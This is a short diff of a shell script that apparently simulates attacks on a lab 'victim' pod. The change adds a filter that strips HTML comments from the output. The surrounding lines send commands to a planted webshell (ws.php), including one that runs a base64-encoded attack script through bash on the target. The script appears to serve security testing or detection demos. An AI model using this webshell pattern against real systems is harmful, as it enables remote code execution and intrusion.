@@ -31,7 +31,7 @@ case $SCENARIO in
     webshell)
         echo "--- Webshell ---"
         echo "Sending command \"whoami\" to victim"
-        curl -Gs --data-urlencode "cmd=whoami" "http://$NAME-victim/ws.php"
+        curl -Gs --data-urlencode "cmd=whoami" "http://$NAME-victim/ws.php" | sed '/<!--/,/-->/d'
         echo " "
         echo "--- Simulation completed ---"
         exit
@@ -45,5 +45,5 @@ script_b64=$(cat $attack_script | base64 -w0)
 echo "--- Webshell ---"
 echo "Sending payload request to the victim pod"
 echo " "
-curl -Gs --data-urlencode "cmd=echo $script_b64| base64 -d| bash" "http://$NAME-victim/ws.php"
+curl -Gs --data-urlencode "cmd=echo $script_b64| base64 -d| bash" "http://$NAME-victim/ws.php" | sed '/<!--/,/-->/d'
 echo "--- Simulation completed ---"
